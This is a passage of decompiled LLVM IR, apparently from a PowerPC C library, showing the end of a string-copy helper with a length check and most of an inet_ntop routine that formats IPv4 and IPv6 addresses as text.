  %v1_1000efc0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000efc0

dec_label_pc_1000f06c:                            ; preds = %dec_label_pc_1000f034
  %v2_1000f06c = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000f06c, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000f074 = add i32 %v1_1000f064, %v2_1000f06c
  store i32 %v2_1000f074, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f06c, i32* @r3, align 4
  %v3_1000f07c = add i32 %v2_1000f074, -1
  %v4_1000f07c = inttoptr i32 %v3_1000f07c to i8*
  store i8 0, i8* %v4_1000f07c, align 1
  %v0_1000f080 = call i32 @__GI_strlen()
  store i32 %v0_1000f080, i32* %r3.global-to-local, align 4
  %v1_1000f084 = load i32, i32* @r30, align 4
  %v3_1000f084 = icmp ugt i32 %v0_1000f080, %v1_1000f084
  br i1 %v3_1000f084, label %dec_label_pc_1000f08c, label %dec_label_pc_1000f0a0

dec_label_pc_1000f08c:                            ; preds = %dec_label_pc_1000f06c
  %v0_1000f08c = call i32 @__errno_location()
  store i32 %v0_1000f08c, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000f098 = inttoptr i32 %v0_1000f08c to i32*
  store i32 28, i32* %v2_1000f098, align 4
  %v0_1000f0b4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0b0

dec_label_pc_1000f0a0:                            ; preds = %dec_label_pc_1000f06c
  %v0_1000f0a0 = load i32, i32* @r29, align 4
  store i32 %v0_1000f0a0, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f06c, i32* %r4.global-to-local, align 4
  %v2_1000f0a8 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000f0a8 = call i32 @strcpy(i32 %v0_1000f0a0, i8* %v2_1000f0a8)
  store i32 %v3_1000f0a8, i32* %r3.global-to-local, align 4
  store i32 %v3_1000f0a8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0b0

dec_label_pc_1000f0b0:                            ; preds = %dec_label_pc_1000f08c, %dec_label_pc_1000f0a0
  %v0_1000f0b4 = phi i32 [ %v0_1000f0b4.pre, %dec_label_pc_1000f08c ], [ %v3_1000f0a8, %dec_label_pc_1000f0a0 ]
  store i32 %v0_1000ef68, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f0b4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f0b4

; uselistorder directives
  uselistorder i32 %v0_1000f0b4, { 1, 0 }
  uselistorder i32 %v2_1000f06c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f068, { 1, 0 }
  uselistorder i32 %v2_1000f064, { 1, 0 }
  uselistorder i32 %v0_1000f038, { 1, 0, 2 }
  uselistorder i32 %v1_1000effc, { 1, 0, 2 }
  uselistorder i32 %v2_1000efec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000efd8, { 1, 0 }
  uselistorder i32 %v0_1000efc4, { 1, 0 }
  uselistorder i32 %v0_1000f0642, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 7, 8, 4, 5, 6, 2 }
  uselistorder [115 x i8]* @global_var_10010000.5, { 1, 0 }
  uselistorder i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), { 39, 40, 41, 5, 6, 7, 42, 43, 0, 44, 45, 8, 10, 11, 12, 13, 14, 15, 16, 9, 17, 2, 1, 18, 20, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 3, 46, 37, 4, 38 }
  uselistorder label %dec_label_pc_1000f0b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f034, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000f0c8 = icmp slt i32 %arg1, 2
  %v3_1000f0c8 = icmp eq i32 %arg1, 2
  store i1 %v1_1000f0c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0c8, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000f0c8, label %dec_label_pc_1000f0f8, label %dec_label_pc_1000f0ec

dec_label_pc_1000f0ec:                            ; preds = %entry
  %v1_1000f0ec = icmp slt i32 %arg1, 10
  %v3_1000f0ec = icmp eq i32 %arg1, 10
  store i1 %v1_1000f0ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f0ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f0ec, label %dec_label_pc_1000f130.lr.ph, label %dec_label_pc_1000f344

dec_label_pc_1000f0f8:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000f108.688 to i32), i32* @lr, align 4
  %v3_1000f104 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000f33c

dec_label_pc_1000f130.lr.ph:                      ; preds = %dec_label_pc_1000f0ec
  %v2_1000f10c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000f10c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f120.689 to i32), i32* @lr, align 4
  %v3_1000f11c = call i32 @__GI_memset(i32 %v2_1000f10c, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000f15015 = load i32, i32* @r27, align 4
  store i32 %v0_1000f15015, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f130

dec_label_pc_1000f130:                            ; preds = %dec_label_pc_1000f130.lr.ph, %dec_label_pc_1000f130
  %v1_1000f144 = phi i32 [ 0, %dec_label_pc_1000f130.lr.ph ], [ %v1_1000f154, %dec_label_pc_1000f130 ]
  %v0_1000f130 = phi i32 [ %v0_1000f15015, %dec_label_pc_1000f130.lr.ph ], [ %v0_1000f150, %dec_label_pc_1000f130 ]
  %v0_1000f138 = phi i32 [ %v0_1000f15015, %dec_label_pc_1000f130.lr.ph ], [ %v2_1000f150, %dec_label_pc_1000f130 ]
  %v1_1000f130 = phi i32 [ 0, %dec_label_pc_1000f130.lr.ph ], [ %v0_1000f148, %dec_label_pc_1000f130 ]
  %v2_1000f130 = add i32 %v0_1000f130, %v1_1000f130
  %v3_1000f130 = inttoptr i32 %v2_1000f130 to i8*
  %v4_1000f130 = load i8, i8* %v3_1000f130, align 1
  %v5_1000f130 = zext i8 %v4_1000f130 to i32
  %v1_1000f134 = add i32 %v1_1000f130, 2
  store i32 %v1_1000f134, i32* %r11.global-to-local, align 4
  %v1_1000f138 = add i32 %v0_1000f138, 1
  %v2_1000f138 = inttoptr i32 %v1_1000f138 to i8*
  %v3_1000f138 = load i8, i8* %v2_1000f138, align 1
  %v4_1000f138 = zext i8 %v3_1000f138 to i32
  %v1_1000f13c = mul nuw nsw i32 %v5_1000f130, 256
  %v2_1000f140 = or i32 %v4_1000f138, %v1_1000f13c
  %v2_1000f144 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000f144 = add i32 %v2_1000f144, %v1_1000f144
  %v4_1000f144 = inttoptr i32 %v3_1000f144 to i32*
  store i32 %v2_1000f140, i32* %v4_1000f144, align 4
  %v0_1000f148 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f148 = udiv i32 %v0_1000f148, 2
  %v0_1000f150 = load i32, i32* @r27, align 4
  %v2_1000f150 = add i32 %v0_1000f150, %v0_1000f148
  store i32 %v2_1000f150, i32* %r9.global-to-local, align 4
  %v1_1000f154 = mul i32 %v1_1000f148, 4
  %v0_1000f158 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f158 = add i32 %v0_1000f158, -1
  store i32 %v1_1000f158, i32* %ctr.global-to-local, align 4
  %v2_1000f158 = icmp eq i32 %v1_1000f158, 0
  br i1 %v2_1000f158, label %dec_label_pc_1000f178.lr.ph, label %dec_label_pc_1000f130

dec_label_pc_1000f178.lr.ph:                      ; preds = %dec_label_pc_1000f130
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f178

dec_label_pc_1000f178:                            ; preds = %dec_label_pc_1000f178.lr.ph, %dec_label_pc_1000f1c4
  %v0_1000f1c8 = phi i32 [ 8, %dec_label_pc_1000f178.lr.ph ], [ %v1_1000f1c8, %dec_label_pc_1000f1c4 ]
  %v0_1000f1b8 = phi i32 [ -1, %dec_label_pc_1000f178.lr.ph ], [ %v0_1000f1b842, %dec_label_pc_1000f1c4 ]
  %v0_1000f1a8 = phi i32 [ -1, %dec_label_pc_1000f178.lr.ph ], [ %v0_1000f1a839, %dec_label_pc_1000f1c4 ]
  %v0_1000f17c = phi i32 [ -1, %dec_label_pc_1000f178.lr.ph ], [ %v0_1000f17c35, %dec_label_pc_1000f1c4 ]
  %v0_1000f1c4 = phi i32 [ 0, %dec_label_pc_1000f178.lr.ph ], [ %v1_1000f1c4, %dec_label_pc_1000f1c4 ]
  %v1_1000f178 = mul i32 %v0_1000f1c4, 4
  %v3_1000f17c = icmp eq i32 %v0_1000f17c, -1
  %v2_1000f180 = add i32 %v1_1000f178, %v2_1000f10c
  %v3_1000f180 = inttoptr i32 %v2_1000f180 to i32*
  %v4_1000f180 = load i32, i32* %v3_1000f180, align 4
  %v3_1000f184 = icmp eq i32 %v4_1000f180, 0
  br i1 %v3_1000f184, label %dec_label_pc_1000f18c, label %dec_label_pc_1000f1a4

dec_label_pc_1000f18c:                            ; preds = %dec_label_pc_1000f178
  br i1 %v3_1000f17c, label %dec_label_pc_1000f190, label %dec_label_pc_1000f19c

dec_label_pc_1000f190:                            ; preds = %dec_label_pc_1000f18c
  store i32 %v0_1000f1c4, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000f1c4

dec_label_pc_1000f19c:                            ; preds = %dec_label_pc_1000f18c
  %v0_1000f19c = load i32, i32* @r31, align 4
  %v1_1000f19c = add i32 %v0_1000f19c, 1
  store i32 %v1_1000f19c, i32* @r31, align 4
  br label %dec_label_pc_1000f1c4

dec_label_pc_1000f1a4:                            ; preds = %dec_label_pc_1000f178
  br i1 %v3_1000f17c, label %dec_label_pc_1000f1c4, label %dec_label_pc_1000f1a8

dec_label_pc_1000f1a8:                            ; preds = %dec_label_pc_1000f1a4
  %v3_1000f1a8 = icmp eq i32 %v0_1000f1a8, -1
  %v0_1000f1bc.pre = load i32, i32* @r31, align 4
  %v1_1000f1b0 = load i32, i32* @r30, align 4
  %v3_1000f1b0 = icmp sgt i32 %v0_1000f1bc.pre, %v1_1000f1b0
  %or.cond = or i1 %v3_1000f1a8, %v3_1000f1b0
  br i1 %or.cond, label %dec_label_pc_1000f1b8, label %dec_label_pc_1000f1c0

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f1a8
  store i32 %v0_1000f1b8, i32* @r28, align 4
  store i32 %v0_1000f1bc.pre, i32* @r30, align 4
  br label %dec_label_pc_1000f1c0

dec_label_pc_1000f1c0:                            ; preds = %dec_label_pc_1000f1a8, %dec_label_pc_1000f1b8
  %v0_1000f1a840 = phi i32 [ %v0_1000f1b8, %dec_label_pc_1000f1b8 ], [ %v0_1000f1a8, %dec_label_pc_1000f1a8 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f1c4

dec_label_pc_1000f1c4:                            ; preds = %dec_label_pc_1000f1a4, %dec_label_pc_1000f19c, %dec_label_pc_1000f190, %dec_label_pc_1000f1c0
  %v0_1000f1b842 = phi i32 [ %v0_1000f1b8, %dec_label_pc_1000f1a4 ], [ %v0_1000f1b8, %dec_label_pc_1000f19c ], [ %v0_1000f1c4, %dec_label_pc_1000f190 ], [ -1, %dec_label_pc_1000f1c0 ]
  %v0_1000f17c35 = phi i32 [ -1, %dec_label_pc_1000f1a4 ], [ %v0_1000f17c, %dec_label_pc_1000f19c ], [ %v0_1000f1c4, %dec_label_pc_1000f190 ], [ -1, %dec_label_pc_1000f1c0 ]
  %v0_1000f1a839 = phi i32 [ %v0_1000f1a8, %dec_label_pc_1000f1a4 ], [ %v0_1000f1a8, %dec_label_pc_1000f19c ], [ %v0_1000f1a8, %dec_label_pc_1000f190 ], [ %v0_1000f1a840, %dec_label_pc_1000f1c0 ]
  %v1_1000f1c4 = add nuw nsw i32 %v0_1000f1c4, 1
  store i32 %v1_1000f1c4, i32* %r11.global-to-local, align 4
  %v1_1000f1c8 = add nsw i32 %v0_1000f1c8, -1
  store i32 %v1_1000f1c8, i32* %ctr.global-to-local, align 4
  %v2_1000f1c8 = icmp eq i32 %v1_1000f1c8, 0
  br i1 %v2_1000f1c8, label %dec_label_pc_1000f1cc, label %dec_label_pc_1000f178

dec_label_pc_1000f1cc:                            ; preds = %dec_label_pc_1000f1c4
  %v3_1000f1cc = icmp eq i32 %v0_1000f1b842, -1
  %v1_1000f1ec = icmp slt i32 %v0_1000f1a839, -1
  %v3_1000f1ec = icmp eq i32 %v0_1000f1a839, -1
  store i1 %v1_1000f1ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f1ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f1cc, label %dec_label_pc_1000f1ec, label %dec_label_pc_1000f1d4

dec_label_pc_1000f1d4:                            ; preds = %dec_label_pc_1000f1cc
  %v0_1000f1e4.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f1ec, label %dec_label_pc_1000f1e4, label %dec_label_pc_1000f1dc

dec_label_pc_1000f1dc:                            ; preds = %dec_label_pc_1000f1d4
  %v1_1000f1dc = load i32, i32* @r30, align 4
  %v2_1000f1dc = icmp slt i32 %v0_1000f1e4.pre, %v1_1000f1dc
  %v3_1000f1dc = icmp sgt i32 %v0_1000f1e4.pre, %v1_1000f1dc
  %v4_1000f1dc = icmp eq i32 %v0_1000f1e4.pre, %v1_1000f1dc
  store i1 %v2_1000f1dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f1dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f1dc, label %dec_label_pc_1000f1e4, label %dec_label_pc_1000f1ec.thread

dec_label_pc_1000f1e4:                            ; preds = %dec_label_pc_1000f1d4, %dec_label_pc_1000f1dc
  store i32 %v0_1000f1e4.pre, i32* @r30, align 4
  store i32 %v0_1000f1b842, i32* @r28, align 4
  br label %dec_label_pc_1000f1ec.thread

dec_label_pc_1000f1ec.thread:                     ; preds = %dec_label_pc_1000f1e4, %dec_label_pc_1000f1dc
  %v0_1000f1f476 = phi i32 [ %v1_1000f1dc, %dec_label_pc_1000f1dc ], [ %v0_1000f1e4.pre, %dec_label_pc_1000f1e4 ]
  %v0_1000f1ec.ph = phi i32 [ %v0_1000f1a839, %dec_label_pc_1000f1dc ], [ %v0_1000f1b842, %dec_label_pc_1000f1e4 ]
  %v1_1000f1ec59 = icmp slt i32 %v0_1000f1ec.ph, -1
  %v3_1000f1ec61 = icmp eq i32 %v0_1000f1ec.ph, -1
  store i1 %v1_1000f1ec59, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f1ec61, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f1f4

dec_label_pc_1000f1ec:                            ; preds = %dec_label_pc_1000f1cc
  br i1 %v3_1000f1ec, label %dec_label_pc_1000f200, label %dec_label_pc_1000f1ec.dec_label_pc_1000f1f4_crit_edge

dec_label_pc_1000f1ec.dec_label_pc_1000f1f4_crit_edge: ; preds = %dec_label_pc_1000f1ec
  %v0_1000f1f4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f1f4

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1ec.dec_label_pc_1000f1f4_crit_edge, %dec_label_pc_1000f1ec.thread
  %v0_1000f1f4 = phi i32 [ %v0_1000f1f476, %dec_label_pc_1000f1ec.thread ], [ %v0_1000f1f4.pre, %dec_label_pc_1000f1ec.dec_label_pc_1000f1f4_crit_edge ]
  %v0_1000f1ec62 = phi i32 [ %v0_1000f1ec.ph, %dec_label_pc_1000f1ec.thread ], [ %v0_1000f1a839, %dec_label_pc_1000f1ec.dec_label_pc_1000f1f4_crit_edge ]
  %v1_1000f1f4 = icmp slt i32 %v0_1000f1f4, 1
  %v2_1000f1f4 = icmp sgt i32 %v0_1000f1f4, 1
  %v3_1000f1f4 = icmp eq i32 %v0_1000f1f4, 1
  store i1 %v1_1000f1f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f1f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f1f4, label %dec_label_pc_1000f200, label %dec_label_pc_1000f1fc

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1f4
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f200:                            ; preds = %dec_label_pc_1000f1f4, %dec_label_pc_1000f1ec, %dec_label_pc_1000f1fc
  %v0_1000f20c3 = phi i32 [ %v0_1000f1ec62, %dec_label_pc_1000f1f4 ], [ -1, %dec_label_pc_1000f1ec ], [ -1, %dec_label_pc_1000f1fc ]
  %v2_1000f200 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000f200, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000f20c4 = icmp slt i32 %v0_1000f20c3, -1
  %v3_1000f20c6 = icmp eq i32 %v0_1000f20c3, -1
  store i1 %v1_1000f20c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f20c6, i1* %cr7_eq.global-to-local, align 1
  %v2_1000f27c = icmp slt i32 %tmp, 65535
  %v4_1000f27c = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000f20c

dec_label_pc_1000f20c:                            ; preds = %dec_label_pc_1000f200, %dec_label_pc_1000f2d8
  %v2_1000f248 = phi i32 [ %v2_1000f200, %dec_label_pc_1000f200 ], [ %v2_1000f23051, %dec_label_pc_1000f2d8 ]
  %v0_1000f21c = phi i32 [ %v0_1000f20c3, %dec_label_pc_1000f200 ], [ %v0_1000f20c, %dec_label_pc_1000f2d8 ]
  %v0_1000f23c = phi i32 [ 0, %dec_label_pc_1000f200 ], [ %v1_1000f2d8, %dec_label_pc_1000f2d8 ]
  %v3_1000f20c7 = phi i1 [ %v3_1000f20c6, %dec_label_pc_1000f200 ], [ %v3_1000f20c, %dec_label_pc_1000f2d8 ]
  br i1 %v3_1000f20c7, label %dec_label_pc_1000f23c, label %dec_label_pc_1000f214

dec_label_pc_1000f214:                            ; preds = %dec_label_pc_1000f20c
  %v2_1000f214 = icmp slt i32 %v0_1000f23c, %v0_1000f21c
  %v4_1000f214 = icmp eq i32 %v0_1000f23c, %v0_1000f21c
  br i1 %v2_1000f214, label %dec_label_pc_1000f23c, label %dec_label_pc_1000f21c

dec_label_pc_1000f21c:                            ; preds = %dec_label_pc_1000f214
  %v1_1000f21c = load i32, i32* @r30, align 4
  %v2_1000f21c = add i32 %v1_1000f21c, %v0_1000f21c
  %v2_1000f220 = icmp slt i32 %v0_1000f23c, %v2_1000f21c
  %v4_1000f220 = icmp eq i32 %v0_1000f23c, %v2_1000f21c
  store i1 %v2_1000f220, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f220, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f220, label %dec_label_pc_1000f228, label %dec_label_pc_1000f23c

dec_label_pc_1000f228:                            ; preds = %dec_label_pc_1000f21c
  br i1 %v4_1000f214, label %dec_label_pc_1000f22c, label %dec_label_pc_1000f2d8

dec_label_pc_1000f22c:                            ; preds = %dec_label_pc_1000f228
  %v3_1000f230 = inttoptr i32 %v2_1000f248 to i8*
  store i8 58, i8* %v3_1000f230, align 1
  %v0_1000f234 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f234 = add i32 %v0_1000f234, 1
  store i32 %v1_1000f234, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f2d8

dec_label_pc_1000f23c:                            ; preds = %dec_label_pc_1000f21c, %dec_label_pc_1000f214, %dec_label_pc_1000f20c
  %v1_1000f23c = icmp slt i32 %v0_1000f23c, 0
  %v3_1000f23c = icmp eq i32 %v0_1000f23c, 0
  store i1 %v1_1000f23c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f23c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f23c, label %dec_label_pc_1000f250.thread, label %dec_label_pc_1000f250

dec_label_pc_1000f250.thread:                     ; preds = %dec_label_pc_1000f23c
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f2b4

dec_label_pc_1000f250:                            ; preds = %dec_label_pc_1000f23c
  %v3_1000f248 = inttoptr i32 %v2_1000f248 to i8*
  store i8 58, i8* %v3_1000f248, align 1
  %v0_1000f24c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f24c = add i32 %v0_1000f24c, 1
  store i32 %v1_1000f24c, i32* %r29.global-to-local, align 4
  %v0_1000f250.pre = load i32, i32* @r31, align 4
  %v1_1000f250 = icmp slt i32 %v0_1000f250.pre, 6
  %v3_1000f250 = icmp eq i32 %v0_1000f250.pre, 6
  store i1 %v1_1000f250, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f250, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f250, label %dec_label_pc_1000f258, label %dec_label_pc_1000f2b4

dec_label_pc_1000f258:                            ; preds = %dec_label_pc_1000f250
  %v0_1000f258 = load i32, i32* @r28, align 4
  %v1_1000f258 = icmp slt i32 %v0_1000f258, 0
  %v3_1000f258 = icmp eq i32 %v0_1000f258, 0
  store i1 %v1_1000f258, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f258, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f258, label %dec_label_pc_1000f260, label %dec_label_pc_1000f2b4

dec_label_pc_1000f260:                            ; preds = %dec_label_pc_1000f258
  %v0_1000f260 = load i32, i32* @r30, align 4
  %v1_1000f260 = icmp slt i32 %v0_1000f260, 6
  %v3_1000f260 = icmp eq i32 %v0_1000f260, 6
  store i1 %v1_1000f260, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f260, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f260, label %dec_label_pc_1000f284, label %dec_label_pc_1000f268

dec_label_pc_1000f268:                            ; preds = %dec_label_pc_1000f260
  %v1_1000f268 = icmp slt i32 %v0_1000f260, 5
  %v3_1000f268 = icmp eq i32 %v0_1000f260, 5
  store i1 %v1_1000f268, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f268, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f268, label %dec_label_pc_1000f270, label %dec_label_pc_1000f2b4

dec_label_pc_1000f270:                            ; preds = %dec_label_pc_1000f268
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000f27c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f27c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000f27c, label %dec_label_pc_1000f284, label %dec_label_pc_1000f2b4

dec_label_pc_1000f284:                            ; preds = %dec_label_pc_1000f270, %dec_label_pc_1000f260
  %v1_1000f284 = load i32, i32* @r1, align 4
  %v2_1000f284 = sub i32 %v1_1000f284, %v1_1000f24c
  %v0_1000f288 = load i32, i32* @r27, align 4
  %v1_1000f288 = add i32 %v0_1000f288, 12
  %v1_1000f28c = add i32 %v2_1000f284, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000f298.690 to i32), i32* @lr, align 4
  %v3_1000f294 = call i32 @inet_ntop4(i32 %v1_1000f288, i32 %v1_1000f24c, i32 %v1_1000f28c)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000f29c = icmp slt i32 %v3_1000f294, 0
  %v3_1000f29c = icmp eq i32 %v3_1000f294, 0
  store i1 %v1_1000f29c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f29c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f29c, label %dec_label_pc_1000f354, label %dec_label_pc_1000f2a4

dec_label_pc_1000f2a4:                            ; preds = %dec_label_pc_1000f284
  %v0_1000f2a4 = load i32, i32* @r29, align 4
  store i32 %v0_1000f2a4, i32* @r3, align 4
  %v0_1000f2a8 = call i32 @__GI_strlen()
  %v0_1000f2ac = load i32, i32* @r29, align 4
  %v2_1000f2ac = add i32 %v0_1000f2ac, %v0_1000f2a8
  store i32 %v2_1000f2ac, i32* %r29.global-to-local, align 4
  %v0_1000f2ec.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f2ec

dec_label_pc_1000f2b4:                            ; preds = %dec_label_pc_1000f250.thread, %dec_label_pc_1000f270, %dec_label_pc_1000f268, %dec_label_pc_1000f258, %dec_label_pc_1000f250
  %v0_1000f2b467 = phi i32 [ 0, %dec_label_pc_1000f250.thread ], [ 6, %dec_label_pc_1000f270 ], [ 6, %dec_label_pc_1000f268 ], [ 6, %dec_label_pc_1000f258 ], [ %v0_1000f250.pre, %dec_label_pc_1000f250 ]
  %v0_1000f29066 = phi i32 [ %v2_1000f248, %dec_label_pc_1000f250.thread ], [ %v1_1000f24c, %dec_label_pc_1000f270 ], [ %v1_1000f24c, %dec_label_pc_1000f268 ], [ %v1_1000f24c, %dec_label_pc_1000f258 ], [ %v1_1000f24c, %dec_label_pc_1000f250 ]
  %v1_1000f2b4 = mul i32 %v0_1000f2b467, 4
  store i32 %v2_1000f10c, i32* %r9.global-to-local, align 4
  %v2_1000f2bc = add i32 %v1_1000f2b4, %v2_1000f10c
  %v3_1000f2bc = inttoptr i32 %v2_1000f2bc to i32*
  %v4_1000f2bc = load i32, i32* %v3_1000f2bc, align 4
  store i32 %v0_1000f29066, i32* @r3, align 4
  store i32 268497620, i32* @lr, align 4
  %v5_1000f2d0 = load i32, i32* @r7, align 4
  %v6_1000f2d0 = load i32, i32* @r8, align 4
  %v9_1000f2d0 = call i32 @sprintf(i32 %v0_1000f29066, i32 ptrtoint ([3 x i8]* @global_var_1001392c.691 to i32), i32 %v4_1000f2bc, i32 %v2_1000f10c, i32 %v5_1000f2d0, i32 %v6_1000f2d0, i32 %v2_1000f10c, i32 ptrtoint (i32* @0 to i32))
  %v0_1000f2d4 = load i32, i32* @r29, align 4
  %v2_1000f2d4 = add i32 %v0_1000f2d4, %v9_1000f2d0
  store i32 %v2_1000f2d4, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f2d8

dec_label_pc_1000f2d8:                            ; preds = %dec_label_pc_1000f228, %dec_label_pc_1000f22c, %dec_label_pc_1000f2b4
  %v2_1000f23051 = phi i32 [ %v2_1000f248, %dec_label_pc_1000f228 ], [ %v1_1000f234, %dec_label_pc_1000f22c ], [ %v2_1000f2d4, %dec_label_pc_1000f2b4 ]
  %v0_1000f2d8 = load i32, i32* @r31, align 4
  %v1_1000f2d8 = add i32 %v0_1000f2d8, 1
  store i32 %v1_1000f2d8, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000f2d8, 8
  %v0_1000f20c = load i32, i32* @r28, align 4
  %v1_1000f20c = icmp slt i32 %v0_1000f20c, -1
  %v3_1000f20c = icmp eq i32 %v0_1000f20c, -1
  store i1 %v1_1000f20c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f20c, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000f20c, label %dec_label_pc_1000f2e4

dec_label_pc_1000f2e4:                            ; preds = %dec_label_pc_1000f2d8
  br i1 %v3_1000f20c, label %dec_label_pc_1000f304, label %dec_label_pc_1000f2ec

dec_label_pc_1000f2ec:                            ; preds = %dec_label_pc_1000f2e4, %dec_label_pc_1000f2a4
  %v2_1000f2fc = phi i32 [ %v2_1000f23051, %dec_label_pc_1000f2e4 ], [ %v2_1000f2ac, %dec_label_pc_1000f2a4 ]
  %v0_1000f2ec = phi i32 [ %v0_1000f20c, %dec_label_pc_1000f2e4 ], [ %v0_1000f2ec.pre, %dec_label_pc_1000f2a4 ]
  %v1_1000f2ec = load i32, i32* @r30, align 4
  %v2_1000f2ec = add i32 %v1_1000f2ec, %v0_1000f2ec
  %v1_1000f2f0 = icmp slt i32 %v2_1000f2ec, 8
  %v3_1000f2f0 = icmp eq i32 %v2_1000f2ec, 8
  store i1 %v1_1000f2f0, i1* %cr7_lt.global-to-local, align 1
